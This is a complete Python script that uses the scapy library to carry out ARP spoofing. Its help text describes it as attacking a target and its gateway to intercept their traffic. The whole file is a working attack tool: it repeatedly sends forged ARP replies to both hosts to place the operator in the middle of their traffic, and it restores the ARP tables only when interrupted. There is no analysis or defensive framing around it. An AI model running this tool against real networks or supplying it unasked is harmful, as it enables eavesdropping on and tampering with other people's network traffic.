#!/usr/bin/python3

import scapy.all as scapy
import argparse
import time


class _Colors:
    HEADER = "\033[95m"
    OKBLUE = "\033[94m"
    OKCYAN = "\033[96m"
    OKGREEN = "\033[92m"
    WARNING = "\033[93m"
    FAIL = "\033[91m"
    ENDC = "\033[0m"
    BOLD = "\033[1m"
    UNDERLINE = "\033[4m"


def argParse():
    parser = argparse.ArgumentParser(
        description="Attack a target IP and gateway IP by ARP spoofing to MITM traffic"
    )
    parser.add_argument(
        "-t", "--target", dest="target", required=True, help="Target IP to MITM"
    )
    parser.add_argument(
        "-g",
        "--gateway",
        dest="gateway",
        required=True,
        help="Gateway IP of the target within the current network",
    )
    options = parser.parse_args()
    return options


def getMac(ip):
    arp = scapy.ARP(pdst=ip)
    broadcast = scapy.Ether(dst="FF:FF:FF:FF:FF:FF")
    arp_request_packet = broadcast / arp
    answered_list = scapy.srp(arp_request_packet, timeout=1, verbose=False)[0]
    return answered_list[0][1].hwsrc


def spoof(target_ip, spoof_ip):
    target_mac = getMac(target_ip)
    packet = scapy.ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=spoof_ip)
    scapy.send(packet, verbose=False)


def restore(dest_ip, src_ip):
    dest_mac = getMac(dest_ip)
    src_mac = getMac(src_ip)
    packet = scapy.ARP(op=2, pdst=dest_ip, hwdst=dest_mac, psrc=src_ip, hwsrc=src_mac)
    scapy.send(packet, verbose=False)


options = argParse()
sent = 0
try:
    while True:
        print(
            "{0}\r[+] Packets sent:".format(_Colors.OKGREEN),
            sent,
            _Colors.ENDC,
            end="\r",
        )
        spoof(options.target, options.gateway)
        spoof(options.gateway, options.target)
        sent += 2
        time.sleep(2)
except KeyboardInterrupt:
    print(
        "{0}\n[!] Fixing ARP tables on targets: please wait...".format(_Colors.WARNING)
    )
    restore(options.target, options.gateway)
    restore(options.gateway, options.target)
    print("{0}\n[+] Done.".format(_Colors.OKGREEN))

